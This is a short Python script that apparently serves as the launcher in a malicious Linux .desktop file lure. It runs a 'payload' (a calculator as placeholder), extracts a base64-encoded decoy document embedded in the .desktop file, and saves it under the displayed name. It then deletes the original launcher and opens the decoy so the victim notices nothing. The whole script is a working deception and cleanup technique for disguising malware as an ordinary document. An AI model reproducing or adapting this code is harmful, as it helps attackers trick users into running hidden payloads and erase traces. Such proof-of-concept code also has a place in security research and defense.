import subprocess
import base64
import re
import os

# Run the payload
subprocess.Popen(["gnome-calculator"])

# Find the desktop file and replace it with the decoy
desktop_filename = os.environ["GIO_LAUNCHED_DESKTOP_FILE"]
current_dir = os.path.dirname(desktop_filename)

with open(desktop_filename, "r") as desktop_file:
    desktop_data = desktop_file.read()

# Extract the file name and decoy file data from the .desktop file
display_name = re.search(r"^Name=(.*)$", desktop_data, re.MULTILINE).group(1)
decoy_data_b64 = re.search(r"^Resource=([\s\S]*)$", desktop_data, re.MULTILINE).group(1)
decoy_data = base64.b64decode(decoy_data_b64)

# Save the decoy file with the same name as the Desktop name
final_filename = os.path.join(current_dir, display_name)
with open(final_filename, "w") as decoy_file:
    decoy_file.write(decoy_data)

# Remove the original .desktop file
os.remove(desktop_filename)

# Do something with the decoy file
subprocess.Popen(["libreoffice", final_filename])
